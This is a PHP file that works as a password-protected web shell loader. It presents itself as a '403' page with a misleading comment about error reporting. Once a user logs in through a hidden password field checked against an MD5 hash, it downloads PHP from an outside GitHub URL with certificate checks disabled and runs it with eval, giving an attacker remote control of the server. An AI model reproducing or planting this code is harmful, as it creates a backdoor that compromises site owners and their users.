<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = 'f004869e14841582b1a28b84437ec970'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/rexorid/shell/refs/heads/main/gel4y.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>403</title>

        <style>
            @font-face {
                font-family: 'GhastlyPanic';
                src: url('000') format('truetype');
            }

            * {
                padding: 0;
                margin: 0;
                box-sizing: border-box;
            }

            body {
                background: black;
                color: aquamarine;
                font-family: Arial, sans-serif;
            }

            .title {
                font-family: 'GhastlyPanic', cursive;
                font-size: 3.3rem;
                margin-top: 15px;
                color: #cc0000;
                letter-spacing: 2px;
            }

            img {
                width: 300px;
                height: auto;
                margin-top: 50px;
            }

            .pas {
                background: transparent;
                border: none;
                padding: 10px 15px;
                margin-top: 20px;
                color: #cc0000;
                outline: none;
                width: 230px;
                text-align: center;
                font-size: 1.1rem;
            }
    
                .pas::placeholder {
                color: transparent;
            }
        </style>

    </head>
    <body>

    <center>
        <form action="" method="POST">
            <img src="https://raw.githubusercontent.com/rexorid/shell/main/img/rxrid.png" alt="logo">
            <h1 class="title">REXORID LOGIN</h1> 

            <input type="password" name="password" id="password" class="pas">
    
        </form>
    </center>

    </body>
    </html>

    <?php
}
?>